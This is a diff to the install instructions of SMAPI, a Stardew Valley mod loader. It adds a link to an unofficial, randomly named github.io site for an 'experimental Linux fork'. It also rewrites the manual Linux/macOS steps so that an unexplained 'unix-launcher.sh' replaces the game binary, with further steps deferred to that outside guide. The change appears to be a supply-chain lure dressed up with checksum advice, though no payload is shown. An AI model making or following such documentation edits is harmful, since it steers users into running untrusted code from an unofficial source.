@@ -16,7 +16,12 @@ SMAPI lets you run Stardew Valley with mods. Don't forget to download mods separ
 
 Automated install
 --------------------------------
-See https://stardewvalleywiki.com/Modding:Player_Guide for help installing SMAPI, adding mods, etc.
+This package may be an unofficial fork. Check the release page and embedded version before running
+it. For the experimental Linux fork, verify the checksum and GitHub attestation first, then see:
+https://4eh5xitv6787h645ebv.github.io/SMAPI/technical/linux-alpha-release.html
+
+For official SMAPI and general mod help, see:
+https://stardewvalleywiki.com/Modding:Player_Guide
 
 
 Manual install
@@ -24,23 +29,23 @@ Manual install
 THIS IS NOT RECOMMENDED FOR MOST PLAYERS. See the instructions above instead.
 If you really want to install SMAPI manually, here's how.
 
-1. Unzip "internal/windows/install.dat" (on Windows) or "internal/unix/install.dat" (on Linux or
-   macOS). You can change '.dat' to '.zip', it's just a normal zip file renamed to prevent
-   confusion.
+1. Unzip "internal/windows/install.dat" (Windows), "internal/linux/install.dat" (Linux), or
+   "internal/macOS/install.dat" (macOS). You can change '.dat' to '.zip'; it is a normal ZIP with
+   another extension to prevent confusion.
 
 2. Copy the files from the folder you just unzipped into your game folder. The
    `StardewModdingAPI.exe` file should be right next to the game's executable.
 
-3. Copy `Stardew Valley.deps.json` in the game folder, and rename the copy to
-   `StardewModdingAPI.deps.json`.
+3. Copy `Stardew Valley.deps.json` in the game folder. On Linux name the copy
+   `StardewModdingAPI-net6.deps.json`; on Windows/macOS name it `StardewModdingAPI.deps.json`.
 
 4.
   - Windows only: if you use Steam, see the install guide above to enable achievements and
     overlay. Otherwise, just run StardewModdingAPI.exe in your game folder to play with mods.
 
-  - Linux/macOS only: rename the "StardewValley" file (no extension) to "StardewValley-original", and
-    "StardewModdingAPI" (no extension) to "StardewValley". Now just launch the game as usual to
-    play with mods.
+  - Linux/macOS only: rename the "StardewValley" file (no extension) to "StardewValley-original",
+    and "unix-launcher.sh" to "StardewValley". Keep "StardewModdingAPI" beside it. Mark the launcher
+    and runtime hosts executable as described in the release guide, then launch the game as usual.
 
 When installing on Linux or macOS:
 - To configure the color scheme, edit the `smapi-internal/config.json` file and see instructions
